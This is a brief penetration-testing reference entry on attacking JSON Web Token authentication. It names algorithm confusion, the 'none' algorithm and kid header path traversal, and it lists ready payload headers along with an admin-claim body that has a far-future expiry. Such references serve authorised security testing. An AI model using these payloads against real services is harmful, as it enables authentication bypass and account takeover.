---
id: "jwt-attack-methodology"
title: "JWT (JSON Web Token) Security Testing"
type: "technique"
category: "web-application"
subcategory: "authentication"
tags: ["jwt", "cryptography", "auth-bypass"]
difficulty: "advanced"
updated: "2026-04-16"
---

## Attack Classes
1. **Algorithm Confusion:** Changing `RS256` to `HS256` and signing with the server's public key.
2. **None Algorithm:** Setting `"alg": "none"` in the header.
3. **KID Injection:** Using directory traversal in the `kid` header to point to a predictable secret (e.g., `/dev/null`).

## Payloads
- Header: `{"alg": "none", "typ": "JWT"}`
- Header: `{"alg": "HS256", "kid": "../../../../../dev/null"}`
- Payload: `{"user": "admin", "exp": 2556057600}` (Far-future expiry)
